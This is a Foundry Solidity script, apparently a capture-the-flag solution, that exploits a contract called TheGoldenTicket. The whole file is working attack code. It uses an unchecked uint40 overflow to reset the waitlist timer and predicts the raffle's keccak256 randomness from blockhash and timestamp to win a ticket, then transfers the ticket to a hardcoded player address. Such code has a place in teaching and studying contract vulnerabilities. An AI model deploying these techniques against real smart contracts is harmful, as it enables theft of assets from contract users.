// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
interface ITheGoldenTicket {
    function giftTicket(address _to) external;

    function hasTicket(address) external view returns (bool);

    function joinRaffle(uint256 _guess) external;

    function joinWaitlist() external;

    function updateWaitTime(uint256 _time) external;

    function waitlist(address) external view returns (uint40);
}
contract HackTicket {
    function getTicket(ITheGoldenTicket ticket) external {
        ticket.joinWaitlist();
        console.log("WT:", ticket.waitlist(address(this)));
        uint256 updateTime;
        unchecked {
            updateTime = uint40(type(uint40).max - ticket.waitlist(address(this)) + 2);
        }
        console.log(updateTime);
        // require(updateTime == 1);
        ticket.updateWaitTime(updateTime);
        console.log("WT:", ticket.waitlist(address(this)));

        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        ticket.joinRaffle(randomNumber);

        require(ticket.hasTicket(address(this)));

        ticket.giftTicket(msg.sender);
    }
}
contract TheGoldenTicketScript is Script {
    ITheGoldenTicket ticket;
    address player = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
    function setUp() public {
        ticket = ITheGoldenTicket(0x15aFCFF324bc6606AD9958450d5123A6Cec9C7ee);
    }
    function run() public {
        attack();
    }
    function attack() public {
        vm.startBroadcast(player);
        // vm.startPrank(player, player);        
        HackTicket hackTicket = new HackTicket();
        hackTicket.getTicket(ticket);
    }
}
